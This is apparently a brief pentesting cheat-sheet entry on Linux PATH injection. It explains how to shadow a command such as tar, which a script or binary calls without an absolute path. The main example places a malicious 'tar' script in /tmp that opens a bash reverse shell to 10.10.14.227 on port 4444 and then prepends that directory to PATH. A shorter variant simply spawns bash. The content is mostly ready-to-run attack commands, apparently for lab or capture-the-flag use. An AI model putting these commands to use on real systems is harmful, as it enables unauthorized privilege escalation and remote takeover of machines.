Some linux scripts/binaries can be exploited by abusing paths.

If a command is performed within a script/binary without specifying an absolute path, we can create a file with the same name, and add the directory of the malicious duplicate file to the beginning of PATH env.

Path Injection example (tar)
```
cd /tmp/
vi tar

	#!/bin/bash
	/bin/bash -i >& /dev/tcp/10.10.14.227/4444 0>&1

chmod +x tar
export PATH=$(pwd):$PATH
echo $PATH
```
when the binary is run next and tar is run, it will run our malicious "tar" script instead of the real binary, and we catch a reverse shell.

NOTE: depending on the shell, we might be about to have the script just run "bash" , no rev-shell one-liner required

#### Alternative
This is dependent on if we have a good shell or not
Malicious "tar"
```
cd /tmp/
vi tar
	#!/bin/bash
	bash
chmod +x tar
export PATH=$(pwd):$PATH
echo $PATH
```